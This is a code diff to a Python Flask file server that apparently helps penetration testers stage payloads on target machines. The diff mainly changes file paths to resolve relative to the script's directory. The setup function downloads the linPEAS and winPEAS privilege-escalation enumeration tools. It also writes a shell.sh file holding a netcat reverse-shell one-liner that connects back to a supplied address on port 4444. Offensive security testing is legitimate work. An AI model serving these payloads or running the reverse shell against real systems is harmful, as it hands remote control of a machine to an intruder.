@@ -48,7 +48,7 @@ def dir_listing(req_path):
     if os.path.exists(abs_path):
         logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
         return send_file(abs_path)
-    elif os.path.isfile(req_path):
+    elif os.path.isfile(os.path.join(os.path.dirname(os.path.abspath(__file__)), req_path)):
         logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
         return send_file(req_path)
     else:
@@ -75,19 +75,20 @@ def logHeaders(verbose, request):
             logger.debug("{0}: {1}".format(h[0], h[1]))
 
 def setup():
-    linpeasFile = 'linpeas.sh'
+    rootPath = os.path.dirname(os.path.abspath(__file__))
+    linpeasFile =  os.path.join(rootPath,'linpeas.sh')
     if not os.path.exists(linpeasFile):
         response = requests.get('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh')
         with open(linpeasFile, mode='wb') as file:
             file.write(response.content)
     
-    winpeasFile = 'winpeas.exe'
+    winpeasFile = os.path.join(rootPath,'winpeas.exe')
     if not os.path.exists(winpeasFile):
         response = requests.get('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasany.exe')
         with open(winpeasFile, mode='wb') as file:
             file.write(response.content)
     
-    shellFile = 'shell.sh'
+    shellFile = os.path.join(rootPath,'shell.sh')
     with  open(shellFile, mode='w') as file:
         file.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} 4444 >/tmp/f".format(args.address))
 
